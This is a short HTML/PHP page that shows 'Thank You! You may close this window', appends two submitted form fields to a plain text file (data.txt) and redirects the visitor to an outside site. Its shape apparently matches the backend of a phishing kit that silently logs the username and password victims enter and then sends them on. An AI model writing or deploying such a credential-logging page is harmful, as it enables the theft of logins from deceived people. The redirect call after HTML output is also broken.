<!DOCTYPE html>
<html>
<body>
<h1>Thank You!</h1>
<h3>You may close this window</h3>

<?php
 $path = 'data.txt';
 if (isset($_POST['field1']) && isset($_POST['field2'])) {
    $fh = fopen($path,"a+");
    $string = $_POST['field1'].' - '.$_POST['field2']."\n";
    fwrite($fh,$string);
    fclose($fh);
 }
?>
<?php
header("Location: http://projectdriverus.8u.cz/");
?>
</body>
</html>